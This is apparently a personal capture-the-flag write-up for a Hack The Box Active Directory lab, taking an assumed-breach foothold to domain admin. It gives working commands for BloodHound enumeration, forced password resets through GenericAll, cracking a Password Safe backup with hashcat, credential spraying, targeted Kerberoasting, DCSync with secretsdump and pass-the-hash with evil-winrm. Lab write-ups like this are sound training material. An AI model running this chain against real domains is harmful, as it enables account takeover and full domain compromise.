2025 - Assumed Breach Active Directory Breach
### NMAP

```
sudo nmap -sC -vv -sV -oN nmap-administrator 10.10.11.42
```
### Initial Access
Assumed breach creds: `Olivia:ichliebedich`

Verify with nxc 
#### nxc
```
nxc smb 10.10.11.42 -u olivia -p ichliebedich
```
### Enumerate for Priv Esc 

#### Python BloodHound 
- using bloodhound-ce branch
```
python3 bloodhound.py -c all -d administrator.htb -u olivia -p ichliebedich -ns 10.10.11.42
```

Starting bloodhound...
```
BLOODHOUND_PORT=8088 docker compose up -d
```

Drag all the bloodhound files to the gui 
![[HackTheBox/Windows/attachments/Pasted image 20250524232656.png]]

#### Manually enumerating bloodhound data 

Try to figure out who has access to ftp directory
```
cat 2025XXX_groups.json | jq .
```

List the groups 
```
cat 2025XXX_groups.json | jq .data[].Properties.name|sort -u -r
```

![[HackTheBox/Windows/attachments/Pasted image 20250524233030.png]]

Grab the last part of domain sid 
![[HackTheBox/Windows/attachments/Pasted image 20250524233207.png]]

Create bash script to look for non-default groups based on SIDs > 1000 
```bash
#!/bin/sh

cat XXXX_groups.json | jq '.data[] | select((.ObjectIdentifier | split("-") | last | tonumber) >1000)'
```

Run this script 

![[HackTheBox/Windows/attachments/Pasted image 20250524233735.png]]

Modify script to filter on object identifier and property names
```bash
#!/bin/sh

cat XXXX_groups.json | jq '.data[] | select((.ObjectIdentifier | split("-") | last | tonumber) >1000) | [.ObjectIdentifier, .Properties.name]'
```

Re-run script 
![[HackTheBox/Windows/attachments/Pasted image 20250524234002.png]]

The custom group is "SHARE MODERATORS"

Back to BloodHound GUI

#### Bloodhound graphing
Examining Olivia's outbound controls to see there is a chain to Benjamin, who has FTP Access
- Set Olivia as owned
- Check Olivia's outbound controls 
- Olivia has GENERIC ALL to Michael so we can mark Michael as owned
![[HackTheBox/Windows/attachments/Pasted image 20250524234421.png]]

- Check Michael's outbound object control which is a path to Benjamin
- Set Benjamin as ending node 

![[HackTheBox/Windows/attachments/Pasted image 20250524234556.png]]

Benjamin is a member of the shared moderators group which was kind of convoluted to discover in the graph. 

Use Olivia's GenericAll to Michael to change his password using net rpc 
![[HackTheBox/Windows/attachments/Pasted image 20250524235019.png]]
#### net rpc 
Change michael's password
```
net rpc password "michael" "P@ssw0rd1!" -U "administrator.htb"/"olivia"%"ichliebedich" -S "10.10.11.42"
```

![[HackTheBox/Windows/attachments/Pasted image 20250524235328.png]]

Change benjamin's password also
```
net rpc password "benjamin" "P@ssw0rd1!" -U "administrator.htb"/"michael"%"P@ssw0rd1!" -S "10.10.11.42"
```

Now we can ftp as benjamin.
### Access ftp files as benjamin

#### FTP 
```
ftp 10.10.11.42
```

![[HackTheBox/Windows/attachments/Pasted image 20250524235729.png]]
- found backup file
- get the file but get a file type warning because the file is a binary 
- change ftp mode to `bin` and re-get the file

![[HackTheBox/Windows/attachments/Pasted image 20250525000002.png]]

### Using hashcat to crack the backup file 

Hashcat knows the .psafe3 file extension
```
hashcat -m 5200 hashes/Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

![[HackTheBox/Windows/attachments/Pasted image 20250525000409.png]]

The password cracked to be `tekieromucho`

### Open the Database 

Install pwsafe 
```
sudo apt install passwordsafe
```

Open pwsafe and enter in cracked password
```
pwsafe
```

Get usernames from this safe 
![[HackTheBox/Windows/attachments/Pasted image 20250525000757.png]]

Create users.txt with these names and create passwords.txt with all those passwords

### NetExec to verify which creds work

Testing out which creds actually work
```
nxc smb 10.10.11.42 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

We have emily's password 
![[HackTheBox/Windows/attachments/Pasted image 20250525001127.png]]

### Bloodhound 
Mark emily as owned in bloodhound.

Check emily's outbound object control and see she has genericwrite over ethan

![[HackTheBox/Windows/attachments/Pasted image 20250525001320.png]]

Check what outbound object control ethan has

![[HackTheBox/Windows/attachments/Pasted image 20250525001359.png]]
- ethan can dcsync the domain so we should try to get ethan


check how to abuse emily's genericwrite over ethan

![[HackTheBox/Windows/attachments/Pasted image 20250525001530.png]]

### Targeted Kerberos

GitHub Repo: https://github.com/ShutdownRepo/targetedKerberoast

```
git clone https://github.com/ShutdownRepo/targetedKerberoast.git
```

Execute the targeted kerberoast 

![[HackTheBox/Windows/attachments/Pasted image 20250525001838.png]]

If clock skew too great run

```
sudo ntpdate 10.10.11.42
```

We get a TGT for ethan
![[HackTheBox/Windows/attachments/Pasted image 20250525002004.png]]

#### back to hashcat to crack the hashie

![[HackTheBox/Windows/attachments/Pasted image 20250525002115.png]]

The hash cracked to `limpbizkit`

Validate creds using nxc (he's not an admin)

![[HackTheBox/Windows/attachments/Pasted image 20250525002225.png]]

### Secretsdump.py

```
secretsdump.py administrator.htb/ethan@10.10.11.42
```
- paste in password

We get admin hashie 

![[HackTheBox/Windows/attachments/Pasted image 20250525002520.png]]

### Priv Esc 

#### evil-winrm
```
evil-winrm -i 10.10.11.42 -u administrator -H <HASHIE>
```

![[HackTheBox/Windows/attachments/Pasted image 20250525002624.png]]

⭐got root⭐